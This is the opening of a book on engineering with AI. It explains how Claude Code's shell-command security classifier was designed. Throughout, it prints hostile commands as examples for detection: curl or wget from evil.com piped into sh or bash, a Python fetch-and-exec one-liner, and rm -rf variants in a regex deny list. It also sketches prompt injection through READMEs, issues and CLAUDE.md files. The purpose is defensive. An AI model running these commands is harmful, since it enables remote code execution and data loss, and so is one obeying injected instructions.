The Thinking Engineer

Problem Solving in the Age of AI — Lessons from Building Claude Code

Tri Doan

20 Chapters + 3 Appendices · ~105,370 words · 2026

Chapter 1: The New Engineering

The Job Changed. Most Engineers Didn't Notice.

Somewhere between 2023 and 2025, the center of gravity in software engineering shifted. It did not shift the way pundits predicted -- engineers were not replaced. Instead, the bottleneck moved. For fifty years, the bottleneck was production: turning a design into working code. Typing. Syntax. Remembering APIs. Debugging off-by-one errors. The scarce resource was the engineer's ability to produce correct implementations.

That bottleneck is gone.

AI writes syntactically correct code faster than any human. It remembers every API. It generates test cases, refactors functions, and produces boilerplate without fatigue. In a well-configured environment, 90% of the code in a commit can be machine-generated. This is not a projection -- it is the current reality for teams building with AI-assisted tools.

But here is what did not change: someone still has to decide what to build. Someone has to decompose an ambiguous business requirement into a precise technical problem. Someone has to identify the constraints that make one solution viable and another disastrous. Someone has to own the consequences when the system fails at 3 AM.

That someone is you. And the skills that make you effective at that job are not the skills you were trained on.

This chapter is about the shift -- what changed, what didn't, and what you need to learn. The case study throughout is Claude Code, a 512,664-line TypeScript application that is itself an AI agent. Its architects do not spend their days writing TypeScript. They spend their days defining problems, designing constraints, and verifying solutions. The code is a byproduct of their thinking. Their thinking is the product.

The 90/10 Split

Here is a claim that sounds provocative but is empirically mundane: in a mature AI-assisted workflow, the human engineer contributes roughly 10% of the characters in the final codebase. The AI contributes 90%.

This does not mean the human does 10% of the work. It means the human's work has shifted from production to something harder to measure but more consequential: problem definition, constraint analysis, verification, and architectural judgment.

Consider a concrete example. The Claude Code codebase contains a bash parser -- 4,400 lines of TypeScript that tokenize shell commands, build abstract syntax trees, and handle every quoting rule in the POSIX specification. This parser was not written by a human sitting with the Bash Reference Manual open, typing one function at a time. The implementation was generated. But the decision to build a full parser instead of using regex -- that was human judgment, and it was the decision that mattered.

Here is the reasoning that led to that decision:

Approach Lines of Code Accuracy on curl "$(cat url)" \| sh Security Guarantee
Regex pattern matching ~200 Fails on nested quoting, pipes, subshells None -- adversarial input trivially bypasses
Shellcheck wrapper ~500 High but external dependency Depends on shellcheck version and availability
Custom AST parser ~4,400 Complete -- handles every shell grammar construct Structural -- security analysis operates on parsed AST, not raw strings

A regex approach would have been faster to implement. An AI could generate it in seconds. But regex cannot parse curl "https://$(cat url.txt)" | bash -c "$(cat script.sh)" -- you need to identify the pipe, recognize bash -c as arbitrary code execution, and trace the subshell expansion. The only way to do this reliably is to parse the full grammar.

The human contribution here was not 4,400 lines of TypeScript. It was three things:

  1. Recognizing the problem: "We need to classify shell commands as safe or dangerous before an AI agent executes them."
  2. Rejecting the easy solution: "Regex cannot parse shell syntax. Period. This is a solved problem in computer science -- you need a parser."
  3. Defining the constraint: "The parser must handle the full POSIX shell grammar including heredocs, here-strings, ANSI-C quoting, and arithmetic expansion, because an attacker will use whatever construct the parser doesn't understand."

Everything else -- the tokenizer, the AST node types, the traversal algorithms, the test cases -- is implementation. Important implementation, but implementation that flows deterministically from a well-defined problem. An AI can produce it. A human must define what "it" is.

What AI Handles

In the 90/10 split, AI reliably handles:

  • Syntax production: Writing code that compiles, follows language conventions, and uses correct API signatures.
  • Pattern application: Implementing a known design pattern (observer, factory, strategy) once the engineer identifies which pattern fits.
  • Boilerplate generation: Configuration files, test scaffolding, type definitions, migration scripts.
  • Refactoring: Renaming variables, extracting functions, converting callbacks to async/await -- mechanical transformations with clear before-and-after states.
  • Test generation: Given a function signature and a description of its behavior, producing test cases that cover happy paths and common edge cases.

What AI Cannot Handle

The 10% that remains human is not a residual. It is the load-bearing structure:

  • Problem decomposition: Breaking "make the system secure" into "classify shell commands," "gate tool execution on permissions," "parse untrusted configuration with trust boundaries." No AI decomposes problems well because decomposition requires understanding the operational context -- who uses the system, what failure looks like, and what constraints the business imposes.
  • Constraint discovery: The 400ms startup budget for Claude Code was not in any requirements document. An engineer measured user perception thresholds, benchmarked competing tools, and set a specific, quantified target that shaped every architectural decision downstream. An AI cannot discover constraints because constraints come from the intersection of technology, users, and business -- not from code.
  • Trade-off navigation: Claude Code uses global mutable state instead of dependency injection. This is "wrong" by every textbook. It is right for a single-process CLI with 15+ deep call stacks and cross-cutting concerns like telemetry and cost tracking. Making that judgment requires understanding the textbook, understanding why it doesn't apply, and being willing to defend the decision. AI defaults to conventional wisdom.
  • Consequence ownership: When a permission system fails and an AI agent executes rm -rf / on a user's machine, a human answers for it. The human who designed the permission architecture, who decided which commands are "safe," who chose the trade-off between usability (don't ask for every command) and safety (block dangerous ones). Ownership cannot be delegated to a model.

The 90/10 in Practice

Here is what a typical feature development looks like in a team that has internalized the 90/10 split:

sequenceDiagram
    participant E as Engineer (10%)
    participant AI as AI Agent (90%)
    participant S as System

    E->>E: Define problem statement
    E->>E: Identify constraints and edge cases
    E->>E: Choose architectural approach
    E->>AI: "Implement X with constraints Y, Z"
    AI->>S: Generate implementation
    AI->>S: Generate tests
    E->>S: Review generated code
    E->>E: Verify against constraints
    E->>E: Check edge cases missed
    E->>AI: "Handle case where input is..."
    AI->>S: Update implementation
    E->>S: Final verification
    E->>S: Approve and merge

The engineer bookends the process. They define the problem at the start and verify the solution at the end. Everything in the middle -- the actual code production -- is delegated. But the bookends are where the engineering happens.

How Claude Code's Architects Think

Claude Code is not just a case study for this book. It is a case study for the 90/10 split because the people who build it practice what we preach. Let us examine how architectural decisions are made in this codebase, and what that reveals about the thinking engineer's job.

Decision: State Management

Every application of significant complexity must decide how to manage state. The options are well-known:

Approach Advantages Disadvantages
Dependency injection Explicit dependencies, testable, concurrent-safe Verbose signatures, container overhead, setup ceremony
Global mutable state Simple access, zero overhead, no parameter threading Implicit dependencies, test isolation burden, refactoring risk
Event sourcing Auditable, replayable, time-travel debugging Complexity, storage cost, eventual consistency
Actor model Isolation, message-passing, fault tolerance Overhead, message serialization, debugging difficulty

A junior engineer picks based on what they know. A textbook engineer picks dependency injection because it's the "correct" answer. A thinking engineer starts with constraints:

  1. Is the application single-process? Yes -- Claude Code is a CLI tool with one user.
  2. Are there concurrent execution contexts? No -- single thread, single event loop.
  3. How deep are the call stacks? The path from user input to bash security analysis traverses 15+ functions.
  4. What are the cross-cutting concerns? Telemetry, cost tracking, session identity, model configuration, feature flags -- accessed from every layer.

Given these constraints, dependency injection is actively harmful. Threading a context object through 15+ function signatures adds noise to every signature in the codebase. The context object would contain the same fields as a global state singleton -- you have not eliminated global state, you have just added a parameter to carry it.

// With dependency injection: every function in the chain needs the context
async function handlePrompt(ctx: AppContext, prompt: string): Promise<Response> {
  const assembled = assembleContext(ctx, prompt);
  const response = await callApi(ctx, assembled);
  for (const tool of response.toolCalls) {
    const permitted = await checkPermission(ctx, tool);
    if (permitted) {
      const result = await executeTool(ctx, tool);
      await recordTelemetry(ctx, tool, result);
    }
  }
}

// With global state: the signatures describe what the functions actually do
async function handlePrompt(prompt: string): Promise<Response> {
  const assembled = assembleContext(prompt);
  const response = await callApi(assembled);
  for (const tool of response.toolCalls) {
    const permitted = await checkPermission(tool);
    if (permitted) {
      const result = await executeTool(tool);
      await recordTelemetry(tool, result);
    }
  }
}

The thinking engineer's decision: global mutable state with accessor functions, enforced by three guard rails:

  1. The state object is never exported directly. Only typed accessor functions (getSessionId(), setCwdState()) are public. This makes every read and mutation grep-able.
  2. Atomic update functions. Fields that must change together have a single update function. switchSession() atomically updates session ID and project directory. There is no way to change one without the other.
  3. Import DAG constraint. The state module has zero imports from the rest of the codebase. An ESLint rule enforces this. The state module sits at the leaf of the import graph, importable from anywhere without creating circular dependencies.

The cost? Every test must call resetStateForTests() in beforeEach. This is boilerplate. It is also straightforward boilerplate -- unlike dependency injection container configuration, which is complex boilerplate.

This decision was not made by generating code and seeing what worked. It was made by analyzing constraints, evaluating trade-offs, and choosing the option that optimizes for the right things. No AI made this decision. An AI implemented it.

Decision: Startup Performance

When you type claude in your terminal, a blinking cursor appears in approximately 390 milliseconds. That number is not accidental. It is a budget.

Human perception research establishes clear thresholds:

  • Under 100ms: Instantaneous. Users do not perceive a delay.
  • 100-400ms: Fast. Users notice but do not mind.
  • 400ms-1 second: Noticeable. Users register a delay but tolerate it.
  • Over 1 second: Slow. Users start doubting whether the command is working.
  • Over 2 seconds: Broken. Users reach for Ctrl+C.

CLI tools compete against git status (50ms), ls (5ms), and python --version (30ms). A 3-second startup makes every invocation feel like a tax. Over a day of heavy use, that tax compounds into resentment. Users find workarounds. Users switch tools.

The thinking engineer's job was not to write fast startup code. It was to set the constraint -- 400ms -- and then design an architecture that makes the constraint achievable. The architecture that emerged:

gantt
    title Claude Code Startup (390ms)
    dateFormat X
    axisFormat %Lms

    section Parallel I/O
    MDM config prefetch        :a1, 0, 20
    Keychain credential read   :a2, 0, 30
    Module evaluation          :a3, 2, 137

    section Sequential
    CLI argument parsing       :b1, 137, 140
    Settings cascade (5 layers):b2, 140, 155
    Authentication             :b3, 155, 160
    Feature flags (GrowthBook) :b4, 160, 210

    section Render
    Telemetry + session init   :c1, 210, 225
    REPL mount + first paint   :c2, 225, 390

The key insight: module evaluation (135ms of synchronous JavaScript parsing) is the longest single blocking operation. The engineers fire asynchronous I/O -- MDM configuration reads, keychain credential fetches -- between import statements, so the I/O runs concurrently with module evaluation. By the time the configuration system needs the results, the subprocesses have already finished.

This is unconventional. Every style guide says "put imports at the top." But imports are not free -- they are 135ms of blocking work. Interleaving async I/O between imports converts dead time into parallel work. The constraint (400ms) forced an unconventional solution. The unconventional solution works.

The 400ms budget also drove other decisions: - Fast-path exits: claude --version prints and exits in 5ms without importing any internal modules. - Compile-time dead code elimination: Features not in the production build are removed at compile time, reducing the binary from ~25,000 lines to ~16,800 lines. - Deferred initialization: MCP registry prefetch, analytics initialization, and remote settings loads run asynchronously after the cursor is visible.

None of these optimizations were discovered by profiling slow code. They were designed from the constraint forward. The engineer said "390ms" and then built backward from that number.

The Verification Imperative

If AI writes 90% of the code, the engineer's most important skill is no longer writing code. It is reading code. Specifically, reading code with the intent to verify that it satisfies constraints the AI was not told about -- or was told about and ignored.

Verification is not testing. Testing confirms that code produces correct outputs for known inputs. Verification confirms that code satisfies properties that may not be expressible as test cases:

  • Does this permission system fail closed? If the rule evaluation engine encounters an unknown rule type, does it block the action (safe) or allow it (dangerous)?
  • Does this configuration merge preserve enterprise policy precedence? If a project-level settings.json defines allow: ["Bash(rm -rf *)"], does the enterprise policy layer override it?
  • Does this parser handle adversarial input? Not just malformed input -- input specifically crafted to exploit the parser's limitations.

In Claude Code, verification is a structured discipline:

Trust Boundary Verification

The system has four trust domains:

graph TB
    subgraph Trusted["Trusted Domain"]
        USER[User Input]
        CFG_USER[User Config]
        AGENT[Agent Source Code]
    end

    subgraph Semi["Semi-Trusted Domain"]
        CFG_PROJ[Project Config]
        CLAUDE_MD[CLAUDE.md Instructions]
        MCP_LOCAL[Local MCP Servers]
    end

    subgraph Untrusted["Untrusted Domain"]
        CODE[Repository Code]
        ISSUES[GitHub Issues / PRs]
        WEB[Fetched Web Content]
    end

    subgraph Model["Model Domain"]
        LLM[LLM-Generated Actions]
    end

    style Trusted fill:#0a4c2e,stroke:#10b981,color:#fff
    style Semi fill:#4a3f00,stroke:#eab308,color:#fff
    style Untrusted fill:#4a0e0e,stroke:#ef4444,color:#fff
    style Model fill:#1e1b4b,stroke:#818cf8,color:#fff

Every piece of data that crosses a trust boundary is a potential attack vector. A malicious repository can contain a .claude/settings.json that grants dangerous permissions. A crafted GitHub issue description can include prompt injection that manipulates the LLM into executing unintended commands. A CLAUDE.md file can inject instructions that override safety guidelines.

The verification question is not "does the code handle these inputs?" It is "does the architecture make it impossible to load untrusted configuration before the user consents?" In Claude Code, the trust dialog runs after authentication but before project settings load. This ordering is a security invariant. If someone reorders the startup phases -- even to optimize performance -- the invariant breaks.

No AI will verify this invariant. An AI does not understand that Phase 9 (trust dialog) must come before Phase 6 (settings cascade) loads project settings. An AI does not understand that applySafeConfigEnvironmentVariables() reads only from ~/.claude/settings.json (user settings, trusted) and not from .claude/settings.json (project settings, semi-trusted). These are design invariants that exist in the engineer's head and in architecture documentation, not in the code.

Failure Mode Verification

The startup sequence handles 10+ failure modes:

Failure Expected Behavior
Invalid settings.json syntax Warning in REPL header; use defaults
MDM read failure Empty MDM settings; no enterprise overrides
Keychain read failure Fall back to environment variable auth
GrowthBook CDN unreachable All flags use coded defaults
No authentication found Restricted mode with authentication prompt
Trust dialog declined Restricted mode; project config ignored
Transcript directory unwritable Warning; session history will not persist

The design principle is clear: Claude Code should always start. A broken config, missing credentials, or unreachable service should degrade functionality, never prevent startup.

Verifying this requires thinking about every boundary, every external dependency, and every I/O operation. What happens when the network is down? What happens when the disk is full? What happens when the enterprise MDM server returns garbage? Each question maps to a specific code path that must be verified to degrade gracefully.

This is the thinking engineer's job. Not writing the error handlers -- the AI can do that. But deciding which errors are fatal (none, in this case) and which are degradable (all of them). Deciding the degradation behavior for each case. And verifying that the implementation matches the design.

The Skill Hierarchy

If the engineer's job has shifted from code production to problem definition and verification, what does the skill hierarchy look like? What should you practice?

Tier 1: Problem Definition (Chapter 2)

The ability to take an ambiguous requirement and produce a precise problem statement. This includes: - Identifying the actual problem (not the symptom, not the first solution that comes to mind) - Discovering constraints that the requirements document did not mention - Defining success criteria that are specific and measurable - Enumerating failure modes before writing a line of code

This is the most undervalued skill in engineering. Chapter 2 is devoted to it entirely.

Tier 2: Decomposition (Chapters 5-8)

The ability to break a complex system into components that can be built, tested, and reasoned about independently. This includes: - Finding natural seam lines where systems can be divided - Designing interfaces that hide implementation details without hiding essential complexity - Managing the interaction between components without creating a tangle

Tier 3: Constraint Analysis (Chapters 3-4)

The ability to reason from constraints rather than from convention. This includes: - Identifying which constraints are fundamental and which are assumed - Using constraints as creative drivers rather than obstacles - Building backward from constraints to architecture

Tier 4: Systems Thinking (Chapters 13-16)

The ability to reason about emergent behavior -- what happens when components interact, when state propagates through feedback loops, when failure cascades across boundaries. This includes: - Following data through the entire system - Modeling state transitions explicitly - Understanding concurrency, coordination, and their costs

Tier 5: Verification (Chapters 17-19)

The ability to confirm that a system satisfies its constraints, not just its test cases. This includes: - Reading code with adversarial intent - Checking invariants that are not captured in tests - Validating failure mode behavior - Understanding what AI-generated code is likely to get wrong

These tiers are not a career ladder. They are all needed simultaneously. But when time is scarce, Tier 1 (problem definition) has the highest leverage. A well-defined problem with a mediocre implementation beats a poorly defined problem with an excellent implementation every time.

The Engineer's New Workflow

Here is the daily workflow of a thinking engineer in 2026:

Morning: Read the requirements for the day's work. Do not open an editor. Do not write code. Spend 30 minutes understanding what problem you are solving, what constraints exist, and what failure looks like. Write a problem statement.

Mid-morning: Design the solution architecture. Not a detailed design -- a constraint map. What are the inputs? What are the outputs? What can go wrong? What are the performance requirements? What are the security boundaries? This is a 30-minute exercise that saves hours of rework.

Late morning through afternoon: Direct the AI. Give it precise problem statements. Review its output against your constraints. Iterate. The cycle is: define, generate, verify, refine. You are not writing code -- you are directing its creation and verifying its correctness.

Late afternoon: Integration verification. Do the components work together? Do the trust boundaries hold? Do the failure modes degrade gracefully? This is where systems thinking pays off -- the individual pieces may be correct, but their composition may not be.

End of day: Update the architectural decisions record. What did you decide? Why? What alternatives did you reject? This documentation is more valuable than the code itself, because the code can be regenerated from a good decision record, but a decision record cannot be reconstructed from code.

This workflow sounds slow. It is not. The total time from problem statement to merged code is shorter than the old workflow because the production step -- the actual coding -- takes minutes instead of hours. The thinking time is the same as it always was. It is just no longer hidden behind typing.

What This Book Teaches

This book is not about Claude Code. Claude Code is the case study -- a 512,664-line codebase that illustrates every principle with concrete, real-world examples. But the principles are universal.

Chapter 2 teaches problem definition -- the most undervalued engineering skill. Chapters 3-4 teach constraint analysis and first principles reasoning. Chapters 5-8 teach decomposition and interface design. Chapters 9-12 teach patterns of thought: designing for failure, building feedback loops, engineering abstractions, and security as structured problem solving. Chapters 13-16 teach systems thinking: data flow, state machines, concurrency, and performance as design. Chapters 17-20 teach the AI-native engineering workflow: human-AI partnership, prompt engineering as problem engineering, verification, and what endures.

Every chapter follows the same structure: principle, concrete example from Claude Code, generalization to your work, and exercises that force you to practice.

The goal is not to make you better at using AI tools. The goal is to make you better at thinking. The tools will change. The thinking endures.

Key Principles

  1. The bottleneck has moved. Production is cheap. Problem definition, constraint analysis, and verification are the scarce skills.

  2. The 90/10 split is real. AI writes most of the code. You define what it should write and verify that it did so correctly.

  3. Constraints drive architecture. Claude Code's 400ms startup budget, single-process model, and security requirements shaped every design decision. Start with constraints, not with code.

  4. Verification is the new writing. Reading code with adversarial intent -- checking invariants, failure modes, and trust boundaries -- is the engineer's primary daily activity.

  5. The thinking is the product. Code is a byproduct of architectural decisions. The decisions are what matter. Document them. Defend them. Iterate on them.

Think About It

  1. Audit your last week of work. What percentage of your time was spent writing code versus defining problems, analyzing constraints, and verifying solutions? If you spent more than 50% writing code, identify one task where better upfront problem definition would have reduced total time.

  2. The regex trap. You need to validate email addresses in a web application. A junior engineer suggests a regex. A senior engineer says "use a library." A thinking engineer asks a different question entirely. What is that question, and how does it change the solution? (Hint: what problem are you actually solving?)

  3. Constraint discovery exercise. Take any system you work on daily. List five constraints that are not documented anywhere -- performance budgets, security assumptions, backwards compatibility requirements, user expectations. For each one, ask: if this constraint were violated, what would break?

  4. The trust boundary audit. Draw a trust boundary diagram for your application. Where does untrusted data enter the system? What prevents that data from being treated as trusted instructions? If you cannot draw this diagram, that is a finding.

  5. Decision archaeology. Find a design decision in your codebase that seems "wrong" by textbook standards (global state, large files, no abstraction layer, duplicated code). Investigate the constraints that led to it. Was it actually the right decision given those constraints? Write a one-paragraph defense of the decision, or a one-paragraph argument for changing it now that constraints have evolved.

Chapter 2: Problem Definition

The Most Expensive Skill You Never Practiced

The most common cause of failed software projects is not bad code. It is not inadequate testing, wrong technology choices, or insufficient staffing. It is building the wrong thing. And you build the wrong thing when you skip problem definition and jump straight to solutions.

This is not a soft-skills lecture. Problem definition is a rigorous engineering discipline with specific techniques, and getting it wrong has quantifiable costs. A misunderstood requirement propagates through design, implementation, testing, and deployment. Each layer amplifies the error. By the time you discover that you solved the wrong problem, you have invested weeks or months in an elaborate solution to a question nobody asked.

In this chapter, we will study problem definition through the lens of one of the most instructive examples in the Claude Code codebase: the bash security system. What started as a simple question -- "which shell commands should an AI agent be allowed to execute?" -- consumed over 12,000 lines of code across six files, required a full shell grammar parser, and evolved through at least four distinct problem formulations before reaching its current architecture. Not because the engineers were indecisive, but because the problem kept revealing new dimensions as they understood it more deeply.

This is the nature of hard problems. They do not arrive well-defined. They arrive as symptoms, complaints, or vague unease. The engineer's job is to interrogate the symptom until the real problem emerges, define it precisely, discover the constraints that bound the solution space, and only then -- only after all of this -- begin solving.

Symptoms Are Not Problems

An engineer reports: "The AI agent executed a dangerous command that deleted user files." This is a symptom. Here are five different problems that could produce this symptom:

  1. The command was inherently dangerous and should have been blocked. (Missing deny rule)
  2. The command looked safe but had a dangerous side effect. (Inadequate analysis)
  3. The user approved the command without reading it. (UX failure)
  4. The LLM was manipulated by prompt injection into requesting the command. (Security boundary failure)
  5. The permission system evaluated the command but misclassified it. (Classifier bug)

Each of these problems leads to a completely different solution. Problem 1 needs a bigger deny list. Problem 2 needs deeper command analysis. Problem 3 needs better permission dialog design. Problem 4 needs prompt injection defenses. Problem 5 needs better classification logic.

If you start coding before identifying which problem you have, you will build the wrong solution. You might add 500 entries to a deny list when the real issue is that your classifier cannot parse pipe chains. You might redesign the permission dialog when the real issue is that untrusted content is injecting commands.

The Interrogation Protocol

When a symptom arrives, resist the urge to solve it. Instead, interrogate it:

What happened? "The agent executed rm -rf ./data/ without asking."

What should have happened? "The agent should have asked for permission before executing a destructive file operation."

Why didn't it? "The permission system classified rm -rf ./data/ as safe."

Why did it classify it as safe? "The deny rules check for rm -rf / (root deletion) but not for rm -rf with relative paths."

What is the general case of this failure? "The deny rules are pattern-based. Any destructive command not explicitly listed in the deny patterns will be misclassified."

Now you have a problem statement: "Pattern-based deny rules cannot cover all dangerous shell commands because the space of dangerous commands is unbounded. We need a classification approach that generalizes." This problem statement points toward structural analysis (parsing commands into components and evaluating their risk) rather than pattern enumeration (adding more deny rules).

The five "why" questions took two minutes. They saved weeks of work on the wrong solution.

The Anatomy of a Problem Statement

A well-formed engineering problem statement has five components:

1. Context

What system are we working in? What are its boundaries? Who are the users?

For the bash security problem in Claude Code:

An AI CLI agent executes shell commands on behalf of an LLM in the user's development environment. The LLM selects commands to achieve user-specified goals. The agent must decide, for each command, whether to execute it immediately, ask the user for permission, or block it entirely.

Context establishes the operating environment. It is not the problem -- it is the stage on which the problem plays out.

2. The Problem

What specific failure are we preventing or capability are we enabling? State it precisely.

We must classify arbitrary shell commands into three categories -- safe to auto-execute, requires user approval, and blocked -- with high accuracy, low latency, and no false negatives on dangerous commands. A false negative (classifying a dangerous command as safe) has catastrophic consequences: data loss, credential theft, or system compromise. A false positive (classifying a safe command as dangerous) has moderate consequences: unnecessary permission prompts that degrade user experience.

This statement establishes the asymmetry. False negatives are catastrophic; false positives are annoying. This asymmetry will drive every design decision.

3. Constraints

What are the non-negotiable boundaries?

Constraints: - Latency: Classification must complete in under 50ms. The user is waiting. - No external dependencies: The classifier cannot shell out to shellcheck, linters, or other tools that may not be installed. - Coverage: The classifier must handle the full POSIX shell grammar, including pipes, redirections, command substitution, arithmetic expansion, heredocs, and every quoting variant. - Adversarial robustness: The LLM may be manipulated by prompt injection. Commands must be evaluated structurally, not by trusting the LLM's stated intent. - Offline operation: The classifier cannot make network calls.

Constraints eliminate solution space. Before discovering these constraints, the solution space included "call an LLM to evaluate each command" (violates latency and offline constraints), "use shellcheck" (violates no-external-dependency constraint), and "trust the LLM's stated intent" (violates adversarial robustness constraint). After constraints, the solution space narrows to: a local, fast, dependency-free classifier that parses the full shell grammar.

4. Success Criteria

How will we know the problem is solved?

Success criteria: - Zero false negatives on a test suite of 200+ known-dangerous command patterns. - Classification latency under 10ms for typical commands (< 100 characters). - Graceful handling of malformed input (unparseable commands default to "requires approval," not "safe"). - No regression in the existing permission system's behavior.

Success criteria must be specific and measurable. "The system should be secure" is not a success criterion. "Zero false negatives on a defined test suite" is.

5. Non-Goals

What are we explicitly not solving?

Non-goals: - We are not preventing the user from running dangerous commands manually. The user can always override. - We are not detecting malware. We are classifying commands by structural risk, not by matching known malware signatures. - We are not sandboxing command execution. Commands run with the user's full permissions.

Non-goals prevent scope creep. Without them, a well-intentioned engineer will extend the bash classifier into a malware detection system, a sandbox, or a full shell emulator. Non-goals are the fence around the problem.

Constraint Discovery: The Hard Part

Writing problem statements is a learnable format. Discovering constraints is the hard part. Constraints are not listed in requirements documents. They emerge from investigation, from talking to users, from understanding the operational environment, and from imagining failure scenarios.

Technique 1: Failure-First Thinking

Instead of asking "how should the system work?", ask "how will the system fail?" For every failure mode, a constraint emerges:

Failure Mode Constraint It Reveals
The LLM generates a command with nested quoting that the parser cannot handle The parser must handle the complete shell grammar
A malicious README injects a prompt that makes the LLM request curl evil.com \| sh Commands must be evaluated structurally, not based on LLM intent
The classifier takes 500ms to parse a long command, making the UX feel broken Classification must complete in under 50ms
A command uses an obscure bash feature (<(process substitution)) that the classifier doesn't recognize Unrecognized constructs must default to "ask user," not "allow"
Enterprise policy requires certain commands to always be blocked, regardless of user preference The classification system must integrate with an externally-defined policy layer

Each row of this table represents a constraint that was not in the original requirements. These constraints were discovered by a thinking engineer who imagined failures before they happened.

Technique 2: Boundary Analysis

Every system has boundaries -- places where your code meets something you do not control. Each boundary is a constraint source:

graph TB
    subgraph Internal["What You Control"]
        PARSER[Shell Parser]
        CLASSIFIER[Risk Classifier]
        RULES[Permission Rules]
    end

    subgraph External["What You Don't Control"]
        SHELL[Shell Grammar<br/>Evolves with bash versions]
        LLM[LLM Behavior<br/>Non-deterministic, manipulable]
        USER[User Expectations<br/>Vary by experience level]
        ENTERPRISE[Enterprise Policy<br/>Varies by organization]
        OS[Operating System<br/>macOS vs Linux vs Windows]
    end

    SHELL -->|constrains| PARSER
    LLM -->|constrains| CLASSIFIER
    USER -->|constrains| RULES
    ENTERPRISE -->|constrains| RULES
    OS -->|constrains| PARSER

    style Internal fill:#0a4c2e,stroke:#10b981,color:#fff
    style External fill:#4a3f00,stroke:#eab308,color:#fff

The shell grammar constrains the parser's complexity. LLM behavior constrains the classifier's trust model. User expectations constrain the UX of permission prompts. Enterprise policy constrains override mechanisms. The operating system constrains which shell features exist.

Each boundary is an interview subject. Ask the boundary: "What can you throw at me that I have not anticipated?"

Technique 3: The "What Can't We Do?" Exercise

Before deciding what you will build, enumerate what you cannot build. This sounds backwards, but it is the fastest way to converge on a viable solution.

For the bash security problem:

What we cannot do: - We cannot sandbox command execution (too complex, too slow, platform-dependent) - We cannot call an LLM for classification (too slow, requires network, non-deterministic) - We cannot use an external tool like shellcheck (dependency we do not control) - We cannot enumerate all dangerous commands (the space is infinite) - We cannot trust the LLM's stated intent ("I'm just reading a file" -- but the command is rm -rf /) - We cannot block all unknown commands (users would abandon the tool)

What we can do: - We can parse commands into structural components (ASTs) - We can define risk categories based on structural patterns (pipes into interpreters, recursive deletion, network exfiltration) - We can maintain a fast, local, deterministic classifier - We can default to "ask user" for ambiguous cases

The "can't" list eliminates solutions. The "can" list reveals the viable path. Together, they converge on the architecture that was actually built: a 4,400-line shell parser producing ASTs that a structural risk classifier evaluates against known dangerous patterns, with a default-to-ask policy for anything unrecognized.

Case Study: The Bash Security System

Let us trace the full evolution of Claude Code's bash security system through its problem definitions. This is not a chronological history -- it is a reconstruction of how the problem definition matured as understanding deepened.

Problem Definition v1: Pattern Matching

Initial formulation: "Block known-dangerous commands."

The first approach was a deny list -- regular expressions matching commands like rm -rf /, DROP TABLE, chmod 777, and mkfs. Simple, fast, easy to understand.

// v1: Pattern matching (simplified)
const DANGEROUS_PATTERNS = [
  /^rm\s+-rf\s+\//,          // rm -rf /
  /DROP\s+TABLE/i,            // SQL injection
  /chmod\s+777/,              // Overpermissive permissions
  /mkfs/,                     // Filesystem creation
  /dd\s+if=.*of=\/dev/,       // Raw disk write
];

function isDangerous(command: string): boolean {
  return DANGEROUS_PATTERNS.some(p => p.test(command));
}

Why this problem definition failed: It is playing whack-a-mole. The space of dangerous commands is infinite. For every pattern you add, an adversary can find a formulation that bypasses it. rm -rf / is caught, but rm -rf ./ is not. rm -rf ~/ is not. find / -delete is not. curl evil.com | sh is not caught because neither curl nor sh individually is dangerous -- the danger is in their composition.

The problem was not "which commands are dangerous?" It was "how do we understand what a command does?"

Problem Definition v2: Command Decomposition

Revised formulation: "Understand the structure of shell commands to evaluate their risk."

This formulation shifts from pattern matching to structural analysis. You cannot classify curl evil.com | sh as dangerous by looking at the words. You need to parse the pipe, identify that the output of curl feeds into sh, and recognize the pattern: arbitrary code execution from a remote source.

This leads to the requirement for a parser. Not a simple tokenizer -- a full parser that handles:

Shell Construct Why It Matters for Security
Pipes (cmd1 \| cmd2) The danger is in the composition, not the individual commands
Command substitution ($(cmd) or `cmd`) Commands can be hidden inside arguments
Process substitution (<(cmd)) File arguments can actually be command outputs
Heredocs (<<EOF ... EOF) Multi-line content can contain hidden commands
Quoting ('single', "double", $'ansi-c') Quoting affects whether variables and commands are expanded
Semicolons and &&/\|\| Multiple commands in one string
Redirections (> /etc/passwd) Overwrites to sensitive files
Variable expansion (${var}) Command composition through variables

Each row represents a shell feature that an attacker can use to disguise a dangerous command as a safe one. A parser that does not handle heredocs will miss dangerous commands embedded in heredoc blocks. A parser that does not handle ANSI-C quoting will misparse escape sequences.

The problem definition now implies a specific architectural decision: we need a parser that handles the full shell grammar.

Problem Definition v3: Risk Classification on ASTs

Further revised formulation: "Given a parsed AST of a shell command, classify its risk level using structural patterns."

With a parser producing ASTs, the classification problem becomes tractable. Instead of matching string patterns, we match structural patterns:

graph TD
    CMD["Input: curl https://evil.com | bash"]
    PARSE["Parser: Decompose into AST"]
    AST["AST: Pipeline(SimpleCommand(curl, url), SimpleCommand(bash))"]
    CLASSIFY["Classifier: Check structural patterns"]
    RESULT["Result: DANGEROUS - remote code execution"]

    CMD --> PARSE
    PARSE --> AST
    AST --> CLASSIFY
    CLASSIFY --> RESULT

    style CMD fill:#4a3f00,stroke:#eab308,color:#fff
    style RESULT fill:#4a0e0e,stroke:#ef4444,color:#fff

The classifier operates on the AST, not on the raw string. It can detect patterns like:

  • Remote code execution: A network command (curl, wget) piped into an interpreter (sh, bash, python, eval)
  • Privilege escalation: Commands prefixed with sudo, su, or doas
  • Destructive file operations: rm with recursive and force flags targeting broad paths
  • Data exfiltration: Commands that read sensitive files and pipe them to network tools
  • System modification: Writing to /etc/, /usr/, system service directories

Each pattern is defined in terms of AST node types and relationships, not string patterns. The pattern for remote code execution is not "the string contains curl and sh" -- it is "a Pipeline node where the left child is a network command and the right child is an interpreter."

This structural approach handles obfuscation that string matching misses:

# All of these match the "remote code execution" structural pattern:
curl https://evil.com | sh
wget -O- https://evil.com | bash
curl https://evil.com | bash -c "$(cat)"
python3 -c "import urllib.request; exec(urllib.request.urlopen('https://evil.com').read())"

The last example shows the limits -- a classifier that only understands shell ASTs cannot trace execution into Python's exec(). The problem definition addresses this by establishing the boundary: classify shell-level risk, not runtime behavior.

Problem Definition v4: Three-Layer Classification

Final formulation: "Classify shell commands through three independent layers -- static rules, structural analysis, and AI-based judgment -- with deny-before-ask-before-allow semantics."

The mature problem definition recognizes that no single classification approach is sufficient:

graph TD
    CMD["Shell Command"]
    L1["Layer 1: Static Rules<br/>Glob patterns from settings<br/>deny > ask > allow"]
    L2["Layer 2: Structural Analysis<br/>AST-based risk patterns<br/>Parser + Security module"]
    L3["Layer 3: AI Classifier<br/>Secondary LLM call<br/>For ambiguous cases only"]
    RESULT["Classification Result"]

    CMD --> L1
    L1 -->|"matched deny"| BLOCK[Blocked]
